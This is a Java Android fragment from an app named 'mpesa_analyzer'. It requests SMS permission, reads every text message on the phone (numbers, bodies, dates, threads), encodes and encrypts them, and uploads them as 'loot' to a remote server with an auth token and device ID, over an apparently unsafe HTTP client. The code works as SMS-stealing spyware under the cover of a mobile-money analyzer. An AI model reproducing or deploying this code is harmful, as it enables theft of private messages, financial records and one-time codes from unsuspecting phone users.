package com.niccher.mpesa_analyzer.frags;

import static android.content.Context.MODE_PRIVATE;
import static android.os.Environment.getExternalStorageDirectory;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.ColorStateList;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentActivity;

import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Base64;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.niccher.mpesa_analyzer.MainActivity;
import com.niccher.mpesa_analyzer.R;
import com.niccher.mpesa_analyzer.adapter.Info_adapter;
import com.niccher.mpesa_analyzer.helpers.Encryptor;
import com.niccher.mpesa_analyzer.helpers.Prefs;
import com.niccher.mpesa_analyzer.helpers.ServiceGenerator;
import com.niccher.mpesa_analyzer.helpers.SummaryResponse;
import com.niccher.mpesa_analyzer.interfaces.JsonProcesses;
import com.niccher.mpesa_analyzer.interfaces.JsonUploadLoot;
import com.niccher.mpesa_analyzer.konstants.Konstants;
import com.niccher.mpesa_analyzer.models.Mod_My_Loot_Count;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.crypto.NoSuchPaddingException;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class Frag_Home extends Fragment {

    public Frag_Home() {
        // Required empty public constructor
    }

    AppCompatActivity activity;

    Konstants kon;
    Prefs prefs;
    PayLoade init;
    StringBuffer sbsent;

    JsonProcesses jsonProcesses;
    Gson gson = null;

    SharedPreferences pref_loot_counter = null;
    SharedPreferences.Editor sharedEditor = null;

    TextView text_get_and_upload, text_get_loot_count, last_time, perm_status, perm_request;
    int SMS_CODE = 102;

    ProgressBar progressBar;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        activity = (AppCompatActivity) getActivity();
        ActionBar supportActionBar = activity.getSupportActionBar();
        if (supportActionBar != null) {
            supportActionBar.setTitle("Home");
            supportActionBar.setDisplayHomeAsUpEnabled(false);
        }
        setHasOptionsMenu(true);

        kon = new Konstants();
        prefs = new Prefs();
        gson = new GsonBuilder()
                .setLenient()
                .create();
        prefs = new Prefs();

        init = new PayLoade();
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View solv = inflater.inflate(R.layout.frag_home, container, false);

        text_get_and_upload = solv.findViewById(R.id.card_text_upload);//home_fetch_sync
        text_get_loot_count = solv.findViewById(R.id.card_text_info_loot);

        last_time = solv.findViewById(R.id.home_last_upload);

        perm_status = solv.findViewById(R.id.card_text_permission);

        perm_request = solv.findViewById(R.id.card_text_req_permission);
        perm_request.setVisibility(View.GONE);

        reqPermission(Manifest.permission.READ_SMS, SMS_CODE);

        progressBar = solv.findViewById(R.id.home_upload_state);
        progressBar.setVisibility(View.GONE);

        perm_request.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.e("Perm /*- ", "perm_request" );
                reqPermission(Manifest.permission.READ_SMS, SMS_CODE);
            }
        });

        text_get_and_upload.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                init.Parser_SMS(getActivity());
            }
        });
        last_time.setText(prefs.get_TimeStamp(getActivity()));
        return  solv;
    }



    public void reqPermission(String permission, int requestCode){
        text_get_loot_count.setText("Synced "+String.valueOf(prefs.get_prefs_auth("loot_count", getActivity())) + " times.");

        if (ContextCompat.checkSelfPermission(getActivity(), Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            permTweak(false);
            requestPermissions(new String[]{Manifest.permission.READ_SMS}, SMS_CODE);
        }else {
            //Log.e("Perm /*- ", "reqPermission: Granted" );
            permTweak(true);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        //super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SMS_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                permTweak(true);
            }
            else {
                AlertDialog alertDialog = new AlertDialog.Builder(getActivity()).create();
                alertDialog.setTitle(getString(R.string.string_dialog_permission_status));
                alertDialog.setMessage(getString(R.string.string_dialog_permission_denied));
                alertDialog.setButton(AlertDialog.BUTTON_NEUTRAL, getString(R.string.string_dialog_permission),
                        new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int which) {
                                dialog.dismiss();
                            }
                        });
                alertDialog.show();
                permTweak(false);
            }
        }
    }

    private void permTweak(boolean perm_granted){
        if (perm_granted){
            perm_status.setTextColor(getResources().getColor(R.color.bg_green));
            perm_status.setText(getText(R.string.string_dialog_permission_granted));;

            perm_request.setVisibility(View.GONE);
        }else {
            perm_status.setTextColor(getResources().getColor(R.color.bg_red));
            perm_status.setText(getText(R.string.string_dialog_permission_denied));

            perm_status.setVisibility(View.GONE);
            perm_request.setVisibility(View.VISIBLE);
        }
    }

    private void Cryptor(File dir_file, InputStream ins){
        File fout = new File(String.valueOf(dir_file));
        try {
            Encryptor cc = new Encryptor();
            cc.encodetoFile(kon.string_key, kon.string_key_spec, ins, new FileOutputStream(fout));
            Log.e(kon.TAGGED, "Cryptor: Encryption Completed" );
        } catch (InvalidAlgorithmParameterException e) {
            e.printStackTrace();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        }
    }

    private void Make_a_File(String file_name, StringBuffer data_source){
        String big_data = String.valueOf(data_source);
        String big_data_enc = Base64.encodeToString(big_data.toString().getBytes(), Base64.DEFAULT);

        FileOutputStream fos = null;

        try {
            fos = getActivity().openFileOutput(kon.string_enc_b64_file+file_name, MODE_PRIVATE);
            fos.write(big_data_enc.getBytes());

            File fi4 = new File(getActivity().getFilesDir() + "/" + kon.string_enc_b64_file+file_name);
            File fi40 = new File(getActivity().getFilesDir() + "/" + kon.string_enc_aes_files+file_name);

            InputStream in = new BufferedInputStream(new FileInputStream(fi4));
            Cryptor(fi40, in);

            init.Parser_Upload(fi40, file_name);

        } catch (FileNotFoundException e) {
            Log.e(kon.TAGGED,"Error 1  "+e.getMessage());
        } catch (IOException e) {
            Log.e(kon.TAGGED,"Error 2  "+e.getMessage());
        } finally {
            if (fos != null) {
                try {
                    fos.close();
                } catch (IOException e) {
                    Log.e(kon.TAGGED,"Error 3  "+e.getMessage());
                }
            }
        }
    }

    private void calc_Loot(){
        pref_loot_counter = getActivity().getSharedPreferences(kon.shared_loot_count, Context.MODE_PRIVATE);

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(kon.upload_summaries)
                .addConverterFactory(GsonConverterFactory.create(gson))
                .client(ServiceGenerator.getUnsafeOkHttpClient())
                .build();

        jsonProcesses = retrofit.create(JsonProcesses.class);

        Map<String, String> parameters = new HashMap<>();
        parameters.put("varUser", prefs.get_prefs_auth("auth", getContext()));
        parameters.put("varDev", prefs.get_prefs_auth("print", getActivity()));

        Call <Mod_My_Loot_Count> call = jsonProcesses.getLootCount(parameters);
        call.enqueue(new Callback<Mod_My_Loot_Count>() {
            @Override
            public void onResponse(Call<Mod_My_Loot_Count> call, Response<Mod_My_Loot_Count> response) {
                if(response.isSuccessful() && response.body()!=null){
                    Mod_My_Loot_Count my_loots = response.body();

                    String msg_time;
                    int msg_count, msg_status;

                    msg_count = my_loots.getMsg_count();
                    msg_status = my_loots.getMsg_status();
                    msg_time = my_loots.getMsg_time();

                    if (msg_status == 1){
                        sharedEditor = pref_loot_counter.edit();
                        sharedEditor.putInt("status", msg_status);
                        sharedEditor.putInt("loots", msg_count);
                        sharedEditor.putString("time", ""+msg_time);
                        sharedEditor.apply();

                        text_get_loot_count.setText("Synced "+ String.valueOf(msg_count) + " times");
                    }
                }
            }

            @Override
            public void onFailure(Call<Mod_My_Loot_Count> call, Throwable t) {
                //Toast.makeText(getActivity(),  t.getMessage()+"\nUnknown error occurred, please try again", Toast.LENGTH_LONG).show();
                Log.e(kon.TAGGED, "calc_Loot Error");
                Log.e(kon.TAGGED, t.getMessage());
            }
        });
    }

    class PayLoade extends Thread {
        @Override
        public void run() {
            super.run();
            Log.e(kon.TAGGED,"<Start Parser>");
            Parser_SMS(getActivity());
        }

        public void Parser_SMS(Context context ){
            Log.e(kon.TAGGED, "Parser_All_SMS->Started >");
            ContentResolver cr = context.getContentResolver();
            Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            int totalSMS = 0;
            String blanks =" ";
            if (c != null) {
                totalSMS = c.getCount();
                if (c.moveToFirst()) {
                    sbsent = new StringBuffer();
                    for (int j = 0; j < totalSMS; j++) {
                        String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        String smsNumber = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String smsBody = Base64.encodeToString(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)).getBytes(), Base64.DEFAULT);;
                        String smsSeen = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.SEEN));
                        String smsThreadid = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID));
                        String sms_id = c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID));

                        String smsType = "";
                        switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                                smsType = "inbox";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_SENT:
                                smsType = "sent";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                                smsType = "outbox";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_QUEUED:
                                smsType = "queued";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                                smsType = "draft";
                                break;
                            default:
                                break;
                        }
                        sbsent.append("{\"Type\": \"" + smsType + "\",\"Number\": \"" + smsNumber + "\",\"Thread Id\": " + smsThreadid + ",\"Date\": " + smsDate + ",\"Body\": \"" + smsBody + "\",\"Seen\": " + smsSeen + ",\"ID\": " + sms_id + " },-------(//)--------");

                        c.moveToNext();
                    }
                }
                Make_a_File("sms_All_" + System.currentTimeMillis(), sbsent);
                c.close();
            } else {
                Log.e(kon.TAGGED, "Parser_All_SMS->No More >");
            }
            Log.e(kon.TAGGED, "Parser_All_SMS->Finished >");
        }

        public void Parser_Upload(File files, String filename){

            progressBar.setVisibility(View.VISIBLE);

            JsonUploadLoot service = ServiceGenerator.createService(JsonUploadLoot.class);
            File file = files;
            Uri fileUri = Uri.fromFile(file);

            RequestBody requestFile = RequestBody.create( MediaType.parse("*/*"), file );

            MultipartBody.Part body = MultipartBody.Part.createFormData("varLoot", filename+".txt", requestFile);

            // add another part within the multipart request
            String part_token = prefs.get_prefs_auth("auth", getActivity());
            String part_dev_id = prefs.get_prefs_auth("print", getActivity());

            RequestBody requestBody0 = RequestBody.create( okhttp3.MultipartBody.FORM, part_token);
            RequestBody requestBody1 = RequestBody.create( okhttp3.MultipartBody.FORM, part_dev_id);

            // finally, execute the request
            Call<ResponseBody> call = service.upload(requestBody0, requestBody1, body);
            call.enqueue(new Callback<ResponseBody>() {
                @Override
                public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                    try {
                        File enc_b64 = new File( getActivity().getFilesDir() + "/" + kon.string_enc_b64_file+filename);
                        File enc_aes = new File(getActivity().getFilesDir() + "/" + kon.string_enc_aes_files+filename);
                        enc_b64.delete();
                        enc_aes.delete();
                        prefs.get_FileType(filename, String.valueOf(System.currentTimeMillis()), getActivity());
                        last_time.setText(prefs.get_TimeStamp(getActivity()));
                        calc_Loot();
                    }catch (Exception es){
                        Log.e(kon.TAGGED, "Delete Files error\n"+es.getMessage());
                    }
                    progressBar.setVisibility(View.GONE);
                }

                @Override
                public void onFailure(Call<ResponseBody> call, Throwable t) {
                    Log.e("Upload error:", t.getMessage());
                    progressBar.setVisibility(View.GONE);
                }
            });

            Log.e(kon.TAGGED, "Upload_Loot: Data Upload" );
        }

    }
}